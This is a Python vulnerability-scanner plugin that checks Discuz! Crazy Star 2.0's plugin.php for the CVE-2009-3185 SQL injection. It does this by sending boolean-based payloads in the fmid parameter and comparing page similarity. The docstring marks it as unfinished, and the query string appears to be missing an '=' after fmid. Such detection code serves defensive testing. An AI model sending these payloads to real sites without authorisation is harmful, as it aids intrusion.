# -*- coding: utf-8 -*-
from random import randint

from engine.engine_utils.common import getRequest, getResponse, getRecord
from engine.engine_utils.rule_result_judge import page_similar
from engine.logger import scanLogger as logger


def run_domain(http,ob):
    '''
    未启用，待写

    CVE-2009-3185
    CNNVD-200909-287
    Discuz! Crazy Star plugin 2.0版本的plugin.php中存在SQL注入漏洞。远程认证用户可以借助一个核查操作中的fmid参数，执行任意SQL指令。
    CVSS分值:	7.5	[严重(HIGH)]

    CWE-89	[SQL命令中使用的特殊元素转义处理不恰当（SQL注入）]
    '''
    scheme = ob['scheme']
    domain = ob['domain']
    path = ob.get('path', '/')
    header = {'Host': domain}
    source_ip = ob.get('source_ip')
    if source_ip:
        domain = source_ip
    result = []
    try:
        if '/' != path[-1]:
            path += '/'
        true_load, false_load = num_type()
        query_t = 'identifier=family&module=family&action=view&fmid%s' % true_load
        query_f = 'identifier=family&module=family&action=view&fmid%s' % false_load
        url_t = '%s://%s%s%s?%s' % (scheme, domain, path, 'plugin.php', query_t)
        url_f = '%s://%s%s%s?%s' % (scheme, domain, path, 'plugin.php', query_f)
        res_t, content_t = http.request(url=url_t, method='GET', headers=header)
        res_f, content_f = http.request(url=url_f, method='GET', headers=header)
        status_t = res_t.get('status', '0')
        status_f = res_f.get('status', '0')
        similar = check_page_similar(status1=status_t, content1=content_t, status2=status_f, content2=content_f)
        if not similar:
            detail = "检测到Discuz! Crazy Star plugin 2.0版本的plugin.php中存在SQL注入漏洞"
            request = getRequest(url_f, domain=ob['domain'])
            response = getResponse(res_f, content_f)
            result.append(getRecord(ob, url_f, ob['level'], detail, request, response))
    except Exception, e:
        logger.error("File:Discuz_Crazy_Star_2_plugin_php_sql_inject.py, run_domain function:%s" % (str(e)))
    return result


def num_type():
    '''
    纯数字类型
    :return:
    '''
    random_num1 = randint(0, 499)
    random_num2 = randint(500, 999)
    true_load = " oR {0}={1}".format(random_num1, random_num1)
    false_load = " aNd {0}={1}".format(random_num1, random_num2)
    return [true_load, false_load]


def check_page_similar(status1, content1, status2, content2, rate=0.96):
    '''
    用于比较页面相似度，插件规则都可以用
    :param status: 响应状态码  str
    :param content: 响应body  str
    :param rate:  相似度阈值
    :return:  True 大于等于阈值，表示页面相似度高； False 小于阈值，表示页面相似度不高
    '''
    page_dict = {'status': status2, 'content': content2, 'similar_rate': rate}
    return page_similar(status1, content1, page_dict)